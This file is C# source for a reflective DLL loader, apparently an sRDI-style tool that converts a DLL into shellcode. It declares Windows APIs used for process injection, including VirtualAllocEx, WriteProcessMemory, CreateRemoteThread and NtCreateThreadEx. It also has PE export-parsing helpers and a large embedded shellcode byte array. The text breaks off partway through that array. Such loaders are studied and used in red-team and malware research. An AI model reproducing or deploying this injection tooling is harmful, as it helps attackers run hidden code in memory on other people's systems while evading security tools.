using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;

namespace RDI
{
    static class Native
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("msvcrt.dll")]
        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

        [DllImport("msvcrt.dll")]
        public static extern IntPtr memset(IntPtr dest, Int32 character, IntPtr count);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, String procName);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, UInt32 dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualFree(IntPtr lpAddress, UIntPtr dwSize, UInt32 dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern Boolean FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hModule, UInt32 timeout);

        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern Boolean ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, out IntPtr lpThreadID);

        [DllImport("kernel32.dll")]
        public static extern Boolean GetExitCodeThread(IntPtr hThread, Int32 exitCode);

        [DllImport("kernel32.dll")]
        public static extern Boolean OpenThreadToken(IntPtr ThreadHandle, UInt32 DesiredAccess, Boolean OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll")]
        public static extern Boolean CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 NtCreateThreadEx(out IntPtr hThread, UInt32 DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, Boolean CreateSuspended, UInt32 StackZeroBits, UInt32 SizeOfStackCommit, UInt32 SizeOfStackReserve, IntPtr lpBytesBuffer);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, out UInt32 lpThreadID);

        [DllImport("kernel32.dll")]
        public static extern Boolean AdjustTokenPrivileges(IntPtr TokenHandle, Boolean DisableAllPrivileges, IntPtr NewState, UInt32 BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("kernel32.dll")]
        public static extern Boolean IsWow64Process(Int32 hProcess);

        public const UInt64 MEM_COMMIT = 0x00001000;
        public const UInt64 MEM_RESERVE = 0x00002000;
        public const ushort PAGE_NOACCESS = 0x01;
        public const ushort PAGE_READONLY = 0x02;
        public const ushort PAGE_READWRITE = 0x04;
        public const ushort PAGE_WRITECOPY = 0x08;
        public const ushort PAGE_EXECUTE = 0x10;
        public const ushort PAGE_EXECUTE_READ = 0x20;
        public const ushort PAGE_EXECUTE_READWRITE = 0x40;
        public const ushort PAGE_EXECUTE_WRITECOPY = 0x80;
        public const UInt32 PAGE_NOCACHE = 0x200;
        public const UInt64 IMAGE_SCN_MEM_DISCARDABLE = 0x02000000;
        public const UInt64 IMAGE_SCN_MEM_EXECUTE = 0x20000000;
        public const UInt64 IMAGE_SCN_MEM_READ = 0x40000000;
        public const UInt64 IMAGE_SCN_MEM_WRITE = 0x80000000;
        public const UInt64 IMAGE_SCN_MEM_NOT_CACHED = 0x04000000;
        public const UInt32 MEM_DECOMMIT = 0x4000;
        public const UInt32 IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002;
        public const UInt32 IMAGE_FILE_DLL = 0x2000;
        public const ushort IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x40;
        public const UInt32 IMAGE_DLLCHARACTERISTICS_NX_COMPAT = 0x100;
        public const UInt32 MEM_RELEASE = 0x8000;
        public const UInt32 TOKEN_QUERY = 0x0008;
        public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const ushort SE_PRIVILEGE_ENABLED = 0x2;
        public const UInt32 ERROR_NO_TOKEN = 0x3f0;
    }

    public class PE
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        //[StructLayout(LayoutKind.Sequential, Pack = 1)]
        [StructLayout(LayoutKind.Explicit)]
        unsafe struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            public fixed byte Name[8];
            [FieldOffset(8)]
            public uint PhysicalAddress;
            [FieldOffset(8)]
            public uint VirtualSize;
            [FieldOffset(12)]
            public uint VirtualAddress;
            [FieldOffset(16)]
            public uint SizeOfRawData;
            [FieldOffset(20)]
            public uint PointerToRawData;
            [FieldOffset(24)]
            public uint PointerToRelocations;
            [FieldOffset(28)]
            public uint PointerToLinenumbers;
            [FieldOffset(32)]
            public ushort NumberOfRelocations;
            [FieldOffset(34)]
            public ushort NumberOfLinenumbers;
            [FieldOffset(36)]
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_EXPORT_DIRECTORY
        {
            public uint Characteristics;
            public uint TimeDateStamp;
            public ushort MajorVersion;
            public ushort MinorVersion;
            public uint Name;
            public uint Base;
            public uint NumberOfFunctions;
            public uint NumberOfNames;
            public uint AddressOfFunctions;     // RVA from base of image
            public uint AddressOfNames;         // RVA from base of image
            public uint AddressOfNameOrdinals;  // RVA from base of image
        }

        enum IMAGE_DOS_SIGNATURE : ushort
        {
            DOS_SIGNATURE = 0x5A4D,      // MZ
            OS2_SIGNATURE = 0x454E,      // NE
            OS2_SIGNATURE_LE = 0x454C,      // LE
        }

        enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b,
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_DOS_HEADER
        {
            public IMAGE_DOS_SIGNATURE e_magic;        // Magic number
            public ushort e_cblp;                      // public bytes on last page of file
            public ushort e_cp;                        // Pages in file
            public ushort e_crlc;                      // Relocations
            public ushort e_cparhdr;                   // Size of header in paragraphs
            public ushort e_minalloc;                  // Minimum extra paragraphs needed
            public ushort e_maxalloc;                  // Maximum extra paragraphs needed
            public ushort e_ss;                        // Initial (relative) SS value
            public ushort e_sp;                        // Initial SP value
            public ushort e_csum;                      // Checksum
            public ushort e_ip;                        // Initial IP value
            public ushort e_cs;                        // Initial (relative) CS value
            public ushort e_lfarlc;                    // File address of relocation table
            public ushort e_ovno;                      // Overlay number
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
            public string e_res;                       // May contain 'Detours!'
            public ushort e_oemid;                     // OEM identifier (for e_oeminfo)
            public ushort e_oeminfo;                   // OEM information; e_oemid specific
            [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;                      // Reserved public ushorts
            public Int32 e_lfanew;                    // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_OPTIONAL_HEADER
        {
            //
            // Standard fields.
            //

            public MagicType Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public uint BaseOfData;
            public uint ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public uint SizeOfStackReserve;
            public uint SizeOfStackCommit;
            public uint SizeOfHeapReserve;
            public uint SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Public;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_OPTIONAL_HEADER64
        {
            public MagicType Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Public;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_NT_HEADERS
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER OptionalHeader;
        }

        public static unsafe class InteropTools
        {
            private static readonly Type SafeBufferType = typeof(SafeBuffer);
            public delegate void PtrToStructureNativeDelegate(byte* ptr, TypedReference structure, uint sizeofT);
            public delegate void StructureToPtrNativeDelegate(TypedReference structure, byte* ptr, uint sizeofT);
            const BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
            private static readonly MethodInfo PtrToStructureNativeMethod = SafeBufferType.GetMethod("PtrToStructureNative", flags);
            private static readonly MethodInfo StructureToPtrNativeMethod = SafeBufferType.GetMethod("StructureToPtrNative", flags);
            public static readonly PtrToStructureNativeDelegate PtrToStructureNative = (PtrToStructureNativeDelegate)Delegate.CreateDelegate(typeof(PtrToStructureNativeDelegate), PtrToStructureNativeMethod);
            public static readonly StructureToPtrNativeDelegate StructureToPtrNative = (StructureToPtrNativeDelegate)Delegate.CreateDelegate(typeof(StructureToPtrNativeDelegate), StructureToPtrNativeMethod);

            private static readonly Func<Type, bool, int> SizeOfHelper_f = (Func<Type, bool, int>)Delegate.CreateDelegate(typeof(Func<Type, bool, int>), typeof(Marshal).GetMethod("SizeOfHelper", flags));

            public static void StructureToPtrDirect(TypedReference structure, IntPtr ptr, int size)
            {
                StructureToPtrNative(structure, (byte*)ptr, unchecked((uint)size));
            }

            public static void StructureToPtrDirect(TypedReference structure, IntPtr ptr)
            {
                StructureToPtrDirect(structure, ptr, SizeOf(__reftype(structure)));
            }

            public static void PtrToStructureDirect(IntPtr ptr, TypedReference structure, int size)
            {
                PtrToStructureNative((byte*)ptr, structure, unchecked((uint)size));
            }

            public static void PtrToStructureDirect(IntPtr ptr, TypedReference structure)
            {
                PtrToStructureDirect(ptr, structure, SizeOf(__reftype(structure)));
            }

            public static void StructureToPtr<T>(ref T structure, IntPtr ptr)
            {
                StructureToPtrDirect(__makeref(structure), ptr);
            }

            public static void PtrToStructure<T>(IntPtr ptr, out T structure)
            {
                structure = default(T);
                PtrToStructureDirect(ptr, __makeref(structure));
            }

            public static T PtrToStructure<T>(IntPtr ptr)
            {
                T obj;
                PtrToStructure(ptr, out obj);
                return obj;
            }

            public static int SizeOf<T>(T structure)
            {
                return SizeOf<T>();
            }

            public static int SizeOf<T>()
            {
                return SizeOf(typeof(T));
            }

            public static int SizeOf(Type t)
            {
                return SizeOfHelper_f(t, true);
            }
        }

        public static IntPtr Rva2Offset(uint dwRva, IntPtr PEPointer)
        {
            bool is64Bit = false;
            ushort wIndex = 0;
            ushort wNumberOfSections = 0;
            IntPtr imageSectionPtr;
            IMAGE_SECTION_HEADER SectionHeader;
            int sizeOfSectionHeader = Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));

            IMAGE_DOS_HEADER dosHeader = InteropTools.PtrToStructure<IMAGE_DOS_HEADER>(PEPointer);

            IntPtr NtHeadersPtr = (IntPtr)((UInt64)PEPointer + (UInt64)dosHeader.e_lfanew);

            var imageNtHeaders32 = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));
            var imageNtHeaders64 = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));

            if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64Bit = true;


            if (is64Bit)
            {
                imageSectionPtr = (IntPtr)(((Int64)NtHeadersPtr + (Int64)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS64), "OptionalHeader") + (Int64)imageNtHeaders64.FileHeader.SizeOfOptionalHeader));
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(imageSectionPtr, typeof(IMAGE_SECTION_HEADER));
                wNumberOfSections = imageNtHeaders64.FileHeader.NumberOfSections;
            }
            else
            {
                imageSectionPtr = (IntPtr)(((Int64)NtHeadersPtr + (Int64)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS), "OptionalHeader") + (Int64)imageNtHeaders32.FileHeader.SizeOfOptionalHeader));
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(imageSectionPtr, typeof(IMAGE_SECTION_HEADER));
                wNumberOfSections = imageNtHeaders32.FileHeader.NumberOfSections;
            }

            if (dwRva < SectionHeader.PointerToRawData)
                return (IntPtr)((UInt64)dwRva + (UInt64)PEPointer);

            for (wIndex = 0; wIndex < wNumberOfSections; wIndex++)
            {
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((IntPtr)((uint)imageSectionPtr + (uint)(sizeOfSectionHeader * (wIndex))), typeof(IMAGE_SECTION_HEADER));
                if (dwRva >= SectionHeader.VirtualAddress && dwRva < (SectionHeader.VirtualAddress + SectionHeader.SizeOfRawData))
                    return (IntPtr)((UInt64)(dwRva - SectionHeader.VirtualAddress + SectionHeader.PointerToRawData) + (UInt64)PEPointer);
            }

            return IntPtr.Zero;
        }

        public static unsafe bool Is64BitDLL(byte[] dllBytes)
        {
            bool is64Bit = false;
            GCHandle scHandle = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
            IntPtr scPointer = scHandle.AddrOfPinnedObject();

            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(scPointer, typeof(IMAGE_DOS_HEADER));

            IntPtr NtHeadersPtr = (IntPtr)((UInt64)scPointer + (UInt64)dosHeader.e_lfanew);

            var imageNtHeaders64 = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));
            var imageNtHeaders32 = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));

            if (imageNtHeaders64.Signature != 0x00004550)
                throw new ApplicationException("Invalid IMAGE_NT_HEADER signature.");

            if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64Bit = true;

            scHandle.Free();

            return is64Bit;
        }

        public static unsafe IntPtr GetProcAddressR(IntPtr PEPointer, string functionName)
        {
            bool is64Bit = false;

            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(PEPointer, typeof(IMAGE_DOS_HEADER));

            IntPtr NtHeadersPtr = (IntPtr)((UInt64)PEPointer + (UInt64)dosHeader.e_lfanew);

            var imageNtHeaders64 = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));
            var imageNtHeaders32 = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));

            if (imageNtHeaders64.Signature != 0x00004550)
                throw new ApplicationException("Invalid IMAGE_NT_HEADER signature.");

            if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64Bit = true;

            IntPtr ExportTablePtr;

            if (is64Bit)
            {
                if ((imageNtHeaders64.FileHeader.Characteristics & 0x2000) != 0x2000)
                    throw new ApplicationException("File is not a DLL, Exiting.");

                ExportTablePtr = (IntPtr)((UInt64)PEPointer + (UInt64)imageNtHeaders64.OptionalHeader.ExportTable.VirtualAddress);
            }
            else
            {
                if ((imageNtHeaders32.FileHeader.Characteristics & 0x2000) != 0x2000)
                    throw new ApplicationException("File is not a DLL, Exiting.");

                ExportTablePtr = (IntPtr)((UInt64)PEPointer + (UInt64)imageNtHeaders32.OptionalHeader.ExportTable.VirtualAddress);
            }

            IMAGE_EXPORT_DIRECTORY ExportTable = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(ExportTablePtr, typeof(IMAGE_EXPORT_DIRECTORY));

            for (int i = 0; i < ExportTable.NumberOfNames; i++)
            {
                IntPtr NameOffsetPtr = (IntPtr)((ulong)PEPointer + (ulong)ExportTable.AddressOfNames);
                NameOffsetPtr += (i * Marshal.SizeOf(typeof(UInt32)));
                IntPtr NamePtr = (IntPtr)((ulong)PEPointer + (uint)Marshal.PtrToStructure(NameOffsetPtr, typeof(uint)));

                string Name = Marshal.PtrToStringAnsi(NamePtr);

                if (Name.Contains(functionName))
                {
                    IntPtr AddressOfFunctions = (IntPtr)((ulong)PEPointer + (ulong)ExportTable.AddressOfFunctions);
                    IntPtr OrdinalRvaPtr = (IntPtr)((ulong)PEPointer + (ulong)(ExportTable.AddressOfNameOrdinals + (i * Marshal.SizeOf(typeof(UInt16)))));
                    UInt16 FuncIndex = (UInt16)Marshal.PtrToStructure(OrdinalRvaPtr, typeof(UInt16));
                    IntPtr FuncOffsetLocation = (IntPtr)((ulong)AddressOfFunctions + (ulong)(FuncIndex * Marshal.SizeOf(typeof(UInt32))));
                    IntPtr FuncLocationInMemory = (IntPtr)((ulong)PEPointer + (uint)Marshal.PtrToStructure(FuncOffsetLocation, typeof(UInt32)));

                    return FuncLocationInMemory;
                }
            }
            return IntPtr.Zero;
        }
    }

    public static class RDILoader
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr ReflectiveLoader();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate bool ExportedFunction(IntPtr userData, uint userLength);

        public static byte[] ConvertToShellcode(byte[] dllBytes, uint functionHash, byte[] userData, uint flags)
        {

            var buf1 = new byte[1298] { 0x85, 0xee, 0x4a, 0x85, 0x66, 0x26, 0x1a, 0x02, 0xbb, 0x4e, 0x79, 0x28, 0x09, 0x55, 0x57, 0x58, 0x59, 0x35, 0xf8, 0xea, 0x24, 0x06, 0x02, 0x02, 0xbb, 0x4b, 0xf9, 0x04, 0x7a, 0x8b, 0x46, 0x26, 0x1e, 0xea, 0x16, 0x06, 0x02, 0x02, 0xbb, 0x5a, 0xa6, 0x55, 0xe7, 0x8b, 0x46, 0x26, 0x22, 0xea, 0x08, 0x06, 0x02, 0x02, 0xbb, 0x12, 0xe3, 0x8c, 0xc5, 0x8d, 0xea, 0xea, 0xfc, 0x05, 0x02, 0x02, 0xbb, 0xb1, 0xb3, 0x5e, 0x96, 0x8b, 0x46, 0x26, 0x2e, 0xea, 0xee, 0x05, 0x02, 0x02, 0xbb, 0x35, 0x02, 0xa0, 0x97, 0x8b, 0x46, 0x26, 0x32, 0xea, 0xe0, 0x05, 0x02, 0x02, 0x8d, 0xda, 0x8d, 0x46, 0x26, 0x5e, 0x8d, 0x7a, 0x3e, 0x05, 0xfa, 0x8b, 0x7e, 0x26, 0x12, 0x83, 0x41, 0x52, 0x47, 0x02, 0x02, 0x76, 0x09, 0x35, 0xc2, 0xeb, 0xba, 0x05, 0x02, 0x02, 0xba, 0x4e, 0x03, 0x02, 0x02, 0x68, 0x3b, 0x49, 0x06, 0x77, 0xf0, 0xf8, 0x49, 0x3a, 0x03, 0x77, 0xea, 0x11, 0xb9, 0x59, 0x08, 0x11, 0xb9, 0x49, 0x16, 0x87, 0xd4, 0x76, 0x24, 0x8f, 0x51, 0x26, 0x05, 0xca, 0x85, 0x7b, 0x06, 0x02, 0x8d, 0x03, 0x77, 0x07, 0x05, 0x49, 0x3a, 0xed, 0x05, 0x05, 0x43, 0x06, 0x3d, 0xc8, 0x11, 0x49, 0xf2, 0x85, 0xc3, 0x2a, 0x85, 0xec, 0x03, 0x77, 0xe5, 0x8f, 0x46, 0x26, 0x36, 0x52, 0x01, 0xd5, 0x8d, 0x46, 0x26, 0x3a, 0x8d, 0x61, 0x52, 0x8f, 0x52, 0x01, 0x8f, 0x4a, 0x01, 0xf9, 0xd4, 0x4a, 0x05, 0xd0, 0x05, 0xc5, 0x25, 0xcc, 0x25, 0xc4, 0x3d, 0xc3, 0x77, 0x99, 0x6c, 0x06, 0x6a, 0x02, 0x32, 0x02, 0x02, 0x55, 0x6c, 0x02, 0x01, 0xd7, 0x8d, 0x79, 0x56, 0x8d, 0xda, 0x8d, 0x46, 0x26, 0x5e, 0x35, 0xcb, 0x8b, 0x46, 0x26, 0x16, 0x8d, 0xd5, 0x35, 0xc2, 0x8b, 0x5e, 0x26, 0x1a, 0x42, 0x8b, 0x46, 0x26, 0x26, 0x87, 0xf8, 0x76, 0x39, 0x8d, 0x6e, 0x26, 0x6e, 0x8d, 0x5e, 0x26, 0x16, 0x25, 0xea, 0x50, 0x87, 0xef, 0x76, 0x1b, 0x8d, 0xc9, 0x2d, 0x46, 0x26, 0x5e, 0x3d, 0xca, 0x75, 0x11, 0x85, 0xfb, 0x3e, 0x74, 0x07, 0x85, 0xfb, 0x40, 0x78, 0x07, 0xc8, 0x04, 0x02, 0xed, 0x06, 0x8c, 0x05, 0x8a, 0x04, 0x43, 0x45, 0x44, 0x87, 0xf8, 0x77, 0xd9, 0x8d, 0x5e, 0x26, 0x1a, 0x11, 0xb9, 0x49, 0x08, 0x11, 0xb9, 0x51, 0x16, 0x87, 0xc2, 0x76, 0x3a, 0x85, 0xc9, 0x2e, 0x05, 0xd1, 0x8d, 0x7e, 0x26, 0x5e, 0x8d, 0x53, 0xfa, 0x4a, 0x8d, 0x33, 0x05, 0xd5, 0x8d, 0x6b, 0xfe, 0x05, 0xf9, 0x8b, 0x46, 0x26, 0x5e, 0x87, 0xef, 0x76, 0x11, 0x8c, 0x08, 0x8a, 0x04, 0x44, 0x48, 0x85, 0xef, 0x03, 0x77, 0xf7, 0x8d, 0x46, 0x26, 0x5e, 0x85, 0xc3, 0x2a, 0x87, 0xc2, 0x77, 0xd7, 0x8d, 0x7e, 0x26, 0x12, 0x8d, 0xb9, 0x82, 0x02, 0x02, 0x02, 0x05, 0xf5, 0x8b, 0x76, 0x26, 0x16, 0x8d, 0x48, 0x0e, 0x87, 0xc2, 0x76, 0x7f, 0x05, 0xc5, 0x52, 0x01, 0x56, 0x26, 0x22, 0x8d, 0x70, 0x12, 0x8d, 0xfa, 0x8d, 0x08, 0x05, 0xed, 0x05, 0xc5, 0x8b, 0x46, 0x26, 0x5e, 0x85, 0x7f, 0x02, 0x02, 0x76, 0x51, 0x8d, 0x76, 0x26, 0x22, 0x8d, 0x0a, 0x87, 0xcb, 0x76, 0x20, 0x7b, 0x1e, 0x8d, 0x49, 0x3e, 0x11, 0xb9, 0xcb, 0x8d, 0x46, 0x3a, 0x7a, 0x2d, 0x4e, 0x3a, 0x12, 0x8d, 0x46, 0x3a, 0x1e, 0x8f, 0x06, 0x8a, 0x8d, 0x06, 0x3a, 0x05, 0xc9, 0xed, 0x0e, 0x8d, 0x47, 0x02, 0x85, 0xc2, 0x04, 0x05, 0xc5, 0x52, 0x59, 0x01, 0xd8, 0x8b, 0x47, 0x02, 0x85, 0xc7, 0x06, 0x8d, 0x46, 0x26, 0x5e, 0x85, 0xc2, 0x06, 0x8b, 0x46, 0x26, 0x5e, 0x85, 0x7f, 0x02, 0x02, 0x77, 0xbb, 0x8d, 0x76, 0x26, 0x16, 0x8d, 0x48, 0x22, 0x85, 0xc8, 0x16, 0x8b, 0x76, 0x26, 0x16, 0x87, 0xc2, 0x77, 0x89, 0x8d, 0x7e, 0x26, 0x12, 0x8d, 0xed, 0x2d, 0x71, 0x36, 0x85, 0xc1, 0xa6, 0x02, 0x02, 0x02, 0x02, 0x11, 0x86, 0xac, 0x02, 0x02, 0x02, 0x8d, 0x99, 0xa2, 0x02, 0x02, 0x02, 0x05, 0xd5, 0x8b, 0x56, 0x26, 0x5e, 0x8f, 0x4c, 0x06, 0x8d, 0x03, 0x8b, 0x4e, 0x26, 0x16, 0x87, 0xc2, 0x11, 0x86, 0x8f, 0x02, 0x02, 0x02, 0x8d, 0x34, 0x8f, 0x7a, 0xfa, 0x05, 0xf5, 0x8f, 0x44, 0x0a, 0xd3, 0xf1, 0x8b, 0x46, 0x26, 0x22, 0x76, 0x62, 0x6c, 0x04, 0x8d, 0xda, 0x5c, 0x11, 0xb9, 0x0d, 0x51, 0x68, 0x8d, 0xc3, 0x68, 0xc3, 0xea, 0x0e, 0x68, 0x85, 0xfa, 0x0c, 0x76, 0x08, 0x68, 0x85, 0xfa, 0x05, 0x77, 0x0d, 0x83, 0xe3, 0x01, 0x11, 0x02, 0x02, 0x03, 0x2e, 0x33, 0xed, 0x29, 0x68, 0x3d, 0x46, 0x26, 0x26, 0x77, 0x13, 0x83, 0xe3, 0x01, 0x11, 0x02, 0x02, 0x8d, 0xc7, 0xc3, 0xea, 0x12, 0x68, 0x03, 0x06, 0x33, 0xed, 0x11, 0x68, 0x3d, 0xc4, 0x77, 0x0c, 0x83, 0xe3, 0x01, 0x11, 0x02, 0x02, 0x68, 0x03, 0x2e, 0x33, 0x05, 0xdc, 0x87, 0x01, 0x77, 0xb3, 0x8d, 0x5e, 0x26, 0x1a, 0x8d, 0x56, 0x26, 0x5e, 0x8d, 0x4e, 